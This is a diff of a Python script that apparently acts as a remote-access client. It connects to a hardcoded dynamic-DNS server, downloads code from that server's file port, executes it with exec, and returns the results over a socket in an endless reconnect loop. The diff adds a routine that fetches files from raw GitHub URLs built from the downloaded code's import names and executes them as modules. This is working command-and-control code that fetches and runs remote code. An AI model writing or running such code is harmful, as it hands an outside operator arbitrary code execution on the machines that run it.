@@ -4,59 +4,110 @@ import subprocess
 import json
 import time
 import getpass
-import requests
 import importlib
-import subprocess
 import threading
+import importlib.util
+import requests
+import tempfile
+import os
 
 SERVER = "posydon.ddns.net"
 PORT = 8080
 FILEPORT = 8081
 
-def install_module(module_name):
+def extract_libraries_from_code(code):
   try:
-    importlib.import_module(module_name)
-  except ImportError:
-    try:
-      subprocess.run(["pip", "install", module_name], check=True)
-      return "Installed module: " + module_name
-    except subprocess.CalledProcessError:
-      raise ImportError(f"Failed to install module: {module_name}")
+      import ast
 
-def execute_code(code):
+      tree = ast.parse(code)
+      library_names = set()
+      for node in ast.walk(tree):
+          if isinstance(node, ast.Import):
+              for alias in node.names:
+                  library_names.add(alias.name)
+          elif isinstance(node, ast.ImportFrom):
+              library_names.add(node.module)
+      return list(library_names)
+
+  except Exception as e:
+      return f"Error during code analysis: {e}"
+    
+def download_libraries(libraries):
+  imported_modules = {}
   try:
-    # Create a dictionary to use as the local and global namespace for execution
-    exec_namespace = {}
-    # Extract import statements from the code
-    import_statements = [line for line in code.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
-    # Extract module names from import statements
-    module_names = [statement.split()[1] for statement in import_statements]
-    # Install any missing modules
-    for module_name in module_names:
-      try:
-        install_module(module_name)
-      except Exception as e:
-        return f"Error installing {module_name}: {e}"
+      for library in libraries:
+          url = f"https://raw.githubusercontent.com/{library.replace('.', '/')}/main/{library.replace('.', '/')}/__init__.py"
+          response = requests.get(url)
+          library_code = response.text
 
-    # Execute the code within the specified namespace
-    exec(code, exec_namespace)
-    # Check if the code defines a function named 'main' and execute it if present
-    if 'main' in exec_namespace and callable(exec_namespace['main']):
-      output = exec_namespace['main']()
-      return output
-    else:
-      return "Code executed successfully - no 'main' function found."
-  except ImportError as e:
-    return f"Error in entire function: {e}"
+          # Save the library code to a temporary file
+          temp_file_path = os.path.join(tempfile.gettempdir(), f"{library.replace('.', '_')}.py")
+          with open(temp_file_path, "w") as temp_file:
+              temp_file.write(library_code)
+
+          # Create a temporary module and import it
+          spec = importlib.util.spec_from_file_location(library, temp_file_path)
+          if spec is not None:
+              module = importlib.util.module_from_spec(spec)
+              loader = spec.loader
+              if loader is not None:
+                  loader.exec_module(module)
+
+                  # Clean up temporary files
+                  os.remove(temp_file_path)
+
+                  imported_modules[library] = module
+
+      return imported_modules
+
+  except Exception as e:
+      return f"Error during library download and import: {e}"
+
+def execute_code(code, libraries):
+  try:
+      # Create a dictionary to use as the local and global namespace for execution
+      exec_namespace = {}
+
+      # Download and import the specified libraries dynamically
+      imported_libraries = download_libraries(libraries)
+
+      # Add imported libraries to the namespace
+      if isinstance(imported_libraries, dict):
+          exec_namespace.update(imported_libraries)
+
+      # Execute the code within the specified namespace
+      exec(code, exec_namespace)
+
+      # Check if the code defines a function named 'main' and execute it if present
+      if 'main' in exec_namespace and callable(exec_namespace['main']):
+          output = exec_namespace['main']()
+          return output
+      else:
+          return "Code executed successfully - no 'main' function found."
+
+  except Exception as e:
+      return f"Error during code execution: {e}"
 
 def execute_module(socket):
-  print('executing module')
-  script = requests.get(f"http://{SERVER}:{FILEPORT}/file").text
-  print(script)
-  result = execute_code(script)
-  data_to_send = {'type': 'response_module', 'data': result}
-  # Encode the dictionary as a JSON string before sending
-  socket.send(json.dumps(data_to_send).encode())
+  try:
+    # Replace this URL with the actual URL you are using to download the code
+    code_url = f"http://{SERVER}:{FILEPORT}/file"
+    code = requests.get(code_url).text
+
+    # Extract library names from the code
+    library_names = extract_libraries_from_code(code)
+
+    # Execute the code with the modified execute_code function
+    result = execute_code(code, library_names)
+
+    data_to_send = {'type': 'response_module', 'data': result}
+    # Encode the dictionary as a JSON string before sending
+    socket.send(json.dumps(data_to_send).encode())
+
+  except Exception as e:
+    error_message = f"Error during module execution: {e}"
+    data_to_send = {'type': 'response_module', 'data': error_message}
+    socket.send(json.dumps(data_to_send).encode())
 
 
 while True: 		# Infinite loop to keep trying to connect
